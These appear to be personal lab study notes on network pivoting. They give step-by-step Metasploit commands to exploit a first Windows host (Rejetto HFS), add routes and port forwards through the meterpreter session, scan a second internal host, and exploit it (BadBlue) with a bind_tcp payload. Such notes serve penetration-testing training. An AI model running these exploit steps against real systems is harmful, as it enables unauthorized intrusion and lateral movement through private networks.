### Pivoting
* A post exploitation technique that utilizes a compromised host to attack other systems on the same private network.
* **HOW**
  * Meterpreter provides us with the ability to add a network route to the internal netwrok's subnet
  * --> Consequently scan --> Exploit other systems on the network.
 
* PRACTICAL
* Repeat steps till db_nmap without setg rhost as we got 2 IPs in this lab.
* `use exploit/windows/http/rejetto_hfs_exec`
* `set rhosts [IP]`
* `run`
* ***
* **Get access to system 2**
  * **Add a route to Victim 1**
    * Inside a meterpreter session
    * `run autoroute -s [subnet range like 10.0.22.0/20]`
    * This route is only applicable to MSFConsole. It doesn't mean that the system can be accessed from anywhere else.
  * **Forward port on Victim2 to meterpreter session**
    * `portfwd add -l [port on the machine with meterpreter session] -p 80 -r [Victim2]`
    * Check it: `portfwd list`
    * Now we should be able to run commands on localhost and know which services are running on the Victim2
    * `db_nmap -sS -sV -p [port mentioned previously] localhost` --> Here we can figure out vulnerabilities running on Victim2
   
  * Now based on the services running on Victim2:
  * In this lab, BadBlue is running on Victim2, so:
  * `use wxploit/windows/http/badblue_passthru`
  * We need to set the payload to bind_tcp as this time we are binding two systems, rather than runnning areverse_tcp where we need a reverse connection.
  * `set payload windows/meterpreter/bind_tcp`
  * `set rhosts [Victim2]`
  * `run` --> Access to Victim2.
